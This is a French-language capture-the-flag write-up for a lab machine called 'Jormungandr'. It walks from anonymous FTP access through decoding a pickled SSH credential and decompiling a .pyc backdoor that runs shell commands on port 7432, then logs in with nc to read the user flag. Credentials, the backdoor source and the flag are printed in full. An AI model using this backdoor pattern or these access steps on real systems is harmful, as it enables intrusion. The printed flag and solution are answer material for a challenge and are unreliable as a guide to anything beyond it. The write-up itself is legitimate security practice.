# CTF "Beware of the mischievous snake, pledge your loyalty to Odin" (Jormungandr)

**Cible :** 10.10.0.13 (également vue en 10.8.1.51 selon le scan initial)
**Objectif de cette phase :** `user.txt`

---

## 1. Reconnaissance

Scan nmap :

```
21/tcp    open     ftp            vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open     ssh            OpenSSH 10.0p2 Debian 7+deb13u4
```

FTP anonyme autorisé → connexion sans mot de passe.

## 2. Exploration FTP

```
ftp 10.10.0.13
Name: anonymous
Password: (vide)
ls -la
```

Fichiers présents :
- `poem.txt` (124 octets)
- `.yggdrasil.cache` (5409 octets, fichier caché)

### `poem.txt`

```
Handar em ek vanr,
en þú hróðrsvitnis,
böl er beggja þrá;
ulfgi hefir ok vel,
er í böndum skal
bíða ragnarökrs.
```

Poème en vieux norrois évoquant Fenrir/Ragnarök — indice thématique pour la suite (nom d'utilisateur).

### `.yggdrasil.cache`

Contenu : une longue chaîne de `0` et `1` (5408 caractères).

## 3. Décodage du cache → credentials SSH

1. **Binaire → octets** : découpage de la chaîne en blocs de 8 bits, conversion en `bytes`.
2. Les premiers octets obtenus (`\x80\x04\x95...`) correspondent à l'en-tête d'un objet **pickle Python** (protocole 4).
3. `pickle.loads()` sur les bytes → désérialise une liste de tuples `(clé, valeur)` du type :
   ```
   ssh_user0 -> 'f'
   ssh_pass0 -> 'I'
   ssh_user1 -> 'e'
   ...
   ```
   Chaque lettre du username/password est stockée séparément et dans le désordre (pickle dédoublonne aussi les objets `str` identiques via des références internes).
4. **Reconstruction** : tri par index numérique (`ssh_user0`→`ssh_user5`, `ssh_pass0`→`ssh_pass31`) puis concaténation des lettres dans l'ordre.

**Script utilisé :**
```python
import pickle

s = "10000000000001..."  # contenu de .yggdrasil.cache
b = bytes(int(s[i:i+8], 2) for i in range(0, len(s) - len(s) % 8, 8))
data = dict(pickle.loads(b))

user = ''.join(data['ssh_user%d' % i] for i in range(6))
pw = ''.join(data['ssh_pass%d' % i] for i in range(32))
print(user, pw)
```

**Résultat :**
```
Username SSH : fenrir
Password SSH : I_will_kill_odin_during_ragnarok
```

## 4. Connexion SSH

```
ssh fenrir@10.10.0.13
# password: I_will_kill_odin_during_ragnarok
```

Dans le home de `fenrir` :

```
fenrir@midgard:~$ ls -la
-rw-r--r-- 1 fenrir fenrir 2386 Jul 23 13:42 mjollnir.pyc
```

## 5. Reverse du fichier `mjollnir.pyc`

### 5.1 Récupération du fichier

Le fichier a été rapatrié en local via `scp` pour analyse :

```bash
scp fenrir@10.10.0.13:~/mjollnir.pyc ./mjollnir.pyc
```

### 5.2 Identification de la version Python (magic number)

```bash
xxd mjollnir.pyc | head -1
# 00000000: 550d 0d0a 0000 0000 ...
```

Les 4 premiers octets (`55 0d 0d 0a`) sont le "magic number" du `.pyc` :
- `0d 0a` (`\r\n`) : constant, sert à détecter une corruption liée aux fins de ligne.
- `55 0d` (little-endian → `0x0d55`) : identifie la version Python de compilation.

Recherche via la bibliothèque `xdis` :
```python
import xdis.magics as m
m.magicint2version[int.from_bytes(bytes.fromhex('550d0d0a')[:2], 'little')]
# → '3.8.0rc1+'
```

→ **Python 3.8**, donc header de 16 octets (PEP 552) et utilisation de `decompyle3` possible (compatible 3.7/3.8) sans avoir besoin d'un interpréteur 3.8 local pour faire un `marshal.load()` direct.

### 5.3 Décompilation

```bash
pip install decompyle3 xdis pycryptodome --break-system-packages
decompyle3 mjollnir.pyc
```

Source reconstruit (extrait pertinent) :

```python
import getpass, os, subprocess
username = long_to_bytes(128672430374905338731062386)
password = long_to_bytes(33643248411776211125062560554130339746417025421355137140099645078910060553582)

class Service(socketserver.BaseRequestHandler):
    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        if username_input == username and password_input == password:
            return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'C:\\User\\Jormungandr> ')
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.send(p.stdout.read())

def main():
    port = 7432
    host = "0.0.0.0"
    server = ThreadedService((host, port), Service)
    ...
```

→ Backdoor TCP maison sur le **port 7432** : demande `Username:`/`Password:`, puis exécute n'importe quelle commande shell reçue (`subprocess.Popen(command, shell=True)`).

Les credentials sont stockés comme de gros entiers, convertis via `long_to_bytes` (obfuscation légère, pas un vrai chiffrement).

### 5.4 Extraction des credentials du service

Script `long_to_byte_mjollnir.py` :

```python
from Crypto.Util.number import long_to_bytes

username = long_to_bytes(128672430374905338731062386)
password = long_to_bytes(33643248411776211125062560554130339746417025421355137140099645078910060553582)

print("username =", username)
print("password =", password)

print("username =", username.decode())
print("password =", password.decode())
```

Résultat :
```
username = jormungandr
password = Jag_ar_Jormungandr_midgardsormen
```

## 6. Connexion au service backdoor et récupération du flag

```
nc 10.10.0.13 7432
Username: jormungandr
Password: Jag_ar_Jormungandr_midgardsormen
Successfully logged in!
```

Puis, via le pseudo-shell (une commande à la fois) :

```
ls -la /home
```
```
drwx------ 1 fenrir      fenrir      4096 Aug 27 09:41 fenrir
drwx------ 1 jormungandr jormungandr 4096 Aug 27 09:41 jormungandr
```

```
ls -la /home/jormungandr
```
```
-r-------- 1 jormungandr jormungandr   26 Jul 23 13:42 user.txt
```

```
cat /home/jormungandr/user.txt
```

** Flag : `EPI{k0mi0_a0_5kUlDAD09Um}`**

---

## Résumé du chemin d'exploitation

| Étape | Action | Résultat |
|---|---|---|
| 1 | Scan nmap | FTP anonyme + SSH ouverts |
| 2 | FTP anonyme | `poem.txt` + `.yggdrasil.cache` |
| 3 | Décodage binaire → pickle Python | Credentials SSH `fenrir` |
| 4 | SSH en `fenrir` | Accès à `mjollnir.pyc` |
| 5 | xxd + xdis (magic number) + decompyle3 | Découverte backdoor port 7432 + credentials chiffrés (`long_to_bytes`) |
| 6 | `long_to_byte_mjollnir.py` | Credentials `jormungandr` en clair |
| 7 | `nc <IP> 7432` | Pseudo-shell en tant que `jormungandr` |
| 8 | `cat user.txt` |  `EPI{k0mi0_a0_5kUlDAD09Um}` |

---

*Prochaine étape (à faire) : privilege escalation de `jormungandr` (ou `fenrir`) vers `root` pour obtenir `root.txt`.*